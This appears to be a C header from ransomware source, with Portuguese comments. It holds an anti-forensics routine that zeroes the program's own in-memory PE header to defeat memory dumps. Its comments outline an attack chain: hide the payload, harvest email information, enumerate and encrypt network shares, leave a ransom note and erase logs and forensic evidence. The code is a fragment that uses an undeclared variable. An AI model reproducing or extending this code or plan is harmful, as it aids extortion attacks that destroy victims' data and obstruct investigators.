#ifndef DUMP_H_INCLUDED
#define DUMP_H_INCLUDED
//dificultar a analise forense,nao esquecer de destruir os logs
VOID  DeleteSectionPex777(){
HMODULE handl=GetModuleHandle(NULL);//identifcador para o modulo atuaç
char *poiter_base=(char*)(handl);
VirtualProtect(poiter_base, 4096, //e
		PAGE_READWRITE, &OldProtect);//alteramos

		SecureZeroMemory(poiter_base,4096);
}//dificultar a analise  pericia forense


#endif // DUMP_H_INCLUDED
// Cadeia de Ataque
// Encodar a carga util num arquivo
//Levante informaçoes email
//ao obter acesso a um  host enumere compartilhamentos de rede e os criptografe
//ao terminar a criptografia deixe a nota de resgate apague os logs e  as evidencias forenses
